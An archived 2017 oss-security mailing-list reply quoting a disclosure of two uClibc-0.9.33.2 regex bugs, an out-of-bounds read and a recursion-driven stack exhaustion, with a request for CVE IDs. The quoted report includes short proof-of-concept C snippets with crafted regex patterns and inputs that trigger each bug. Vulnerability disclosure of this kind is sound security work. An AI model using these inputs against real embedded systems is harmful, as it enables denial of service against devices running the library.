X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2220" "Friday" "16" "June" "2017" "01:21:53" "-0400" "Zach W" "kestrel@trylinux.us" "<01c242ae-3570-c98c-4e29-8b736bd0b1dd@trylinux.us>" "93" "Re: [oss-security] two vulns in uClibc-0.9.33.2" "^Date:" nil nil "6" "2017061605:21:53" "[oss-security] two vulns in uClibc-0.9.33.2" (number mark "        kestrel@tryl Jun 16   93/2220  " thread-indent "\"Re: [oss-security] two vulns in uClibc-0.9.33.2\"\n") "<tencent_18C312B86EA079DA42B11D83@qq.com>" ("<tencent_18C312B86EA079DA42B11D83@qq.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 32731 invoked by uid 550); 16 Jun 2017 12:43:22 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32181 invoked from network); 16 Jun 2017 05:22:07 -0000
References: <tencent_18C312B86EA079DA42B11D83@qq.com>
Message-ID: <01c242ae-3570-c98c-4e29-8b736bd0b1dd@trylinux.us>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0)
 Gecko/20100101 Thunderbird/52.1.1
MIME-Version: 1.0
In-Reply-To: <tencent_18C312B86EA079DA42B11D83@qq.com>
Content-Type: multipart/alternative;
 boundary="------------379BB0A0BC44874B0419A13C"
Content-Language: en-US
Date: Fri, 16 Jun 2017 01:21:53 -0400
From: Zach W <kestrel@trylinux.us>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] two vulns in uClibc-0.9.33.2
To: oss-security@lists.openwall.com, fefe <qbenjin@qq.com>

--------------379BB0A0BC44874B0419A13C
Content-Type: text/plain; charset=windows-1252
Content-Transfer-Encoding: 7bit

s/large\ number/nearly\ all/g

Talking millions, not thousands.

Zach W.


On 6/15/17 11:53 PM, fefe wrote:
> I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
>
>
> one is about line 2682 of get_subexp.c :
>
>
> 		if (BE (bkref_str_off >= mctx->input.valid_len, 0))
> 		{
> 		  /* If we are at the end of the input, we cannot match.  */
> 		  if (bkref_str_off >= mctx->input.len)
> 		    break;
>
>
> 		  err = extend_buffers (mctx);
> 		  if (BE (err != REG1_NOERROR, 0))
> 		    return err;
>
>
> 		  buf = (const char *) re_string_get_buffer (&mctx->input);
> 		}
> 	      if (buf [bkref_str_off++] != buf[sl_str - 1])
> 		break; /* We don't need to search this sub expression
> 		
> "bkref_str_off >= mctx->input.valid_len" , when  bkref_str_off == mctx->input.valid_len, "buf [bkref_str_off++] != buf[sl_str - 1]" case Out of one bit bounds read
>
>
> The poc code like:
> 	
> 	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
> 	{		
>         	reg1match_t pmatch[1];
> 		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
> 		regfree(&regtmp);
> 	}
>
>
>
>
>
>
> The another is aout line 1837 of regexce.c :
>
>
> 		check_dst_limits_calc_pos_1 (const re_match_context_t *mctx, int boundaries,
> 			     int subexp_idx, int from_node, int bkref_idx)
>                 .......
>
>
> 		  cpos =
> 		    check_dst_limits_calc_pos_1 (mctx, boundaries, subexp_idx,
> 						 dst, bkref_idx);
>
>
> 		
> check_dst_limits_calc_pos_1 recursive calls case DDOS, because of stack exhaustion.
>
>
> The poc code like:	
> 	
> 	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\xBD", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
> 	{		
>         	reg1match_t pmatch[1];
> 		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
> 		regfree(&regtmp);
> 	}
>
>
>
>
> A large number of embedded devices uses uclibc instead of glibc.
> Could you assign CVE id for those?
>
>
> Thank you
>
>
> Benjin Liu
> Codesafe Team of Qihoo 360


--------------379BB0A0BC44874B0419A13C--
